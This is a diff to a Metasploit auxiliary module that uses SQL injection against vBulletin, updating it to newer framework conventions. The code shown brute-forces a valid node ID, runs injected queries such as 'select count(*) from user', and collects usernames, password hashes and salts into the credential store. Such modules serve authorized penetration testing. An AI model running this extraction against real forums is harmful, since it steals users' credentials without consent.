@@ -1,12 +1,9 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
-class Metasploit3 < Msf::Auxiliary
-
+class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Report
   include Msf::Exploit::Remote::HttpClient
 
@@ -43,7 +40,7 @@ class Metasploit3 < Msf::Auxiliary
         OptInt.new("NODE", [false, 'Valid Node ID']),
         OptInt.new("MINNODE", [true, 'Valid Node ID', 1]),
         OptInt.new("MAXNODE", [true, 'Valid Node ID', 100])
-      ], self.class)
+      ])
   end
 
   def exists_node?(id)
@@ -62,7 +59,7 @@ class Metasploit3 < Msf::Auxiliary
     max = datastore["MAXNODE"]
 
     if min > max
-      print_error("#{peer} - MINNODE can't be major than MAXNODE")
+      print_error("MINNODE can't be major than MAXNODE")
       return nil
     end
 
@@ -77,11 +74,11 @@ class Metasploit3 < Msf::Auxiliary
 
   def get_node
     if datastore['NODE'].nil? or datastore['NODE'] <= 0
-      print_status("#{peer} - Brute forcing to find a valid node id...")
+      print_status("Brute forcing to find a valid node id...")
       return brute_force_node
     end
 
-    print_status("#{peer} - Checking node id #{datastore['NODE']}...")
+    print_status("Checking node id #{datastore['NODE']}...")
     if exists_node?(datastore['NODE'])
       return datastore['NODE']
     else
@@ -145,24 +142,51 @@ class Metasploit3 < Msf::Auxiliary
     Msf::Exploit::CheckCode::Safe
   end
 
+  def report_cred(opts)
+    service_data = {
+      address: opts[:ip],
+      port: opts[:port],
+      service_name: opts[:service_name],
+      protocol: 'tcp',
+      workspace_id: myworkspace_id
+    }
+
+    credential_data = {
+      origin_type: :service,
+      module_fullname: fullname,
+      username: opts[:user],
+      private_data: opts[:password],
+      private_type: :nonreplayable_hash,
+      jtr_format: 'md5'
+    }.merge(service_data)
+
+    login_data = {
+      core: create_credential(credential_data),
+      status: Metasploit::Model::Login::Status::UNTRIED,
+      proof: opts[:proof]
+    }.merge(service_data)
+
+    create_credential_login(login_data)
+  end
+
   def run
-    print_status("#{peer} - Checking for a valid node id...")
+    print_status("Checking for a valid node id...")
     node_id = get_node
     if node_id.nil?
-      print_error("#{peer} - node id not found")
+      print_error("node id not found")
       return
     end
 
-    print_good("#{peer} - Using node id #{node_id} to exploit sqli... Counting users...")
+    print_good("Using node id #{node_id} to exploit sqli... Counting users...")
     data = do_sqli(node_id, "select count(*) from user")
     if data.blank?
-      print_error("#{peer} - Error exploiting sqli")
+      print_error("Error exploiting sqli")
       return
     end
     count_users = data.to_i
-    print_good("#{peer} - #{count_users} users found. Collecting credentials...")
+    print_good("#{count_users} users found. Collecting credentials...")
 
-    users_table = Rex::Ui::Text::Table.new(
+    users_table = Rex::Text::Table.new(
       'Header'  => 'vBulletin Users',
       'Indent'   => 1,
       'Columns' => ['Username', 'Password Hash', 'Salt']
@@ -171,15 +195,14 @@ class Metasploit3 < Msf::Auxiliary
     for i in 0..count_users
       user = get_user_data(node_id, i)
       unless user.join.empty?
-        report_auth_info({
-         :host => rhost,
-         :port => rport,
-         :user => user[0],
-         :pass => user[1],
-         :type => "hash",
-         :sname => (ssl ? "https" : "http"),
-         :proof => "salt: #{user[2]}" # Using proof to store the hash salt
-        })
+        report_cred(
+          ip: rhost,
+          port: rport,
+          user: user[0],
+          password: user[1],
+          service_name: (ssl ? "https" : "http"),
+          proof: "salt: #{user[2]}"
+        )
         users_table << user
       end
     end
